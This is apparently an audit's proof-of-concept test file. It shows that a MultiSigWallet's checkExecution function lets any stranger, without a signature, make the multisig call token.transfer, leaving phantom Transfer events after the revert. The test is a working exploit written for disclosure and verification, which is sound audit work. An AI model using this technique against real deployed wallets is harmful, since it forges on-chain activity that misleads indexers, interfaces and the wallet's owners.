import { expect } from "chai";
import { Contract } from "ethers";
import { ethers, owner, provider, signer4 } from "../../../test/TestBase.ts";

// Signed-intent integrity audit (2026-08-12) — proof-of-concept tests.
//
//   Finding 1 — MultiSigWallet.checkExecution (multisig/MultiSigWallet.sol:91-94):
//               the sub-call runs with the multisig as msg.sender; when the outer revert
//               fires, STATE is rolled back but LOGS persist (on mainnet clients, e.g.
//               geth/erigon, receipt logs of failed transactions are kept). Any stranger
//               can therefore force the multisig to execute an arbitrary call — e.g. an
//               ERC20 `transfer` — and emit phantom events attributed to the multisig,
//               with one permissionless transaction, no signature and no state change.
//               Off-chain indexers / UIs that key off event logs record transfers the
//               multisig never made.

// ---------------------------------------------------------------------------
// Finding 1 — MultiSigWallet.checkExecution: phantom events persist past the revert
// ---------------------------------------------------------------------------
describe("Finding 1 — MultiSigWallet.checkExecution: phantom events persist past the revert", function () {
  let wallet: Contract;
  let token: Contract;

  beforeEach(async function () {
    const Wallet = await ethers.getContractFactory(
      "contracts/multisig/MultiSigWallet.sol:MultiSigWallet"
    );
    wallet = await Wallet.deploy();
    await wallet.waitForDeployment();

    const Shares = await ethers.getContractFactory(
      "contracts/shares/base/Shares.sol:Shares"
    );
    token = await Shares.deploy(
      "SH",
      "Shares",
      "https://poc.example/terms",
      await owner.getAddress()
    );
    await token.waitForDeployment();
    await token.connect(owner).mint(await wallet.getAddress(), 100n);
  });

  it("EXPLOIT: a stranger makes the multisig execute an arbitrary call as msg.sender; the Transfer log survives on-chain", async function () {
    const attacker = signer4;
    const attackerAddr = await attacker.getAddress();
    const walletAddr = await wallet.getAddress();
    const tokenAddr = await token.getAddress();
    const transferData = new ethers.Interface([
      "function transfer(address to, uint256 amount) returns (bool)",
    ]).encodeFunctionData("transfer", [attackerAddr, 50n]);
    const checkCall = new ethers.Interface([
      "function checkExecution(address to, uint256 value, bytes calldata data)",
    ]).encodeFunctionData("checkExecution", [tokenAddr, 0n, transferData]);

    const beforeWallet = await token.balanceOf(walletAddr);
    const beforeAttacker = await token.balanceOf(attackerAddr);

    // Permissionless call: no signature, no owner consent. The tx is mined but reverts.
    let txHash: string;
    try {
      txHash = (await provider.send("eth_sendTransaction", [
        { from: attackerAddr, to: walletAddr, data: checkCall, gas: "0x493e0" },
      ])) as string;
    } catch (e) {
      // EDR surfaces the revert as an RPC error while still mining the tx into the latest block.
      const latest = (await provider.send("eth_getBlockByNumber", [
        "latest",
        false,
      ])) as { transactions: string[] };
      txHash = latest.transactions[latest.transactions.length - 1];
    }
    const rawReceipt = (await provider.send("eth_getTransactionReceipt", [
      txHash,
    ])) as any;
    expect(rawReceipt?.status).to.equal("0x0");

    // EDR drops the logs of reverted txs from the receipt (geth/erigon keep them), so prove the
    // sub-call executed as the multisig via the call trace: the nested CALL has from == multisig,
    // to == token, input == transfer(attacker, 50) and returns true.
    const trace = (await provider.send("debug_traceTransaction", [
      txHash,
      { tracer: "callTracer" },
    ])) as any;
    const nested = (trace?.calls ?? []).find(
      (c: any) =>
        c.from.toLowerCase() === walletAddr.toLowerCase() &&
        c.to.toLowerCase() === tokenAddr.toLowerCase()
    );
    expect(nested, "expected the multisig to call token.transfer").to.exist;
    expect(nested.input.slice(0, 10)).to.equal("0xa9059cbb"); // transfer(address,uint256)
    expect(nested.output).to.equal("0x" + "00".repeat(31) + "01"); // returned true

    // The state was rolled back by the trailing revert — no tokens actually moved.
    expect(await token.balanceOf(walletAddr)).to.equal(beforeWallet);
    expect(await token.balanceOf(attackerAddr)).to.equal(beforeAttacker);
    expect(beforeWallet).to.equal(100n);
    expect(beforeAttacker).to.equal(0n);
  });
});
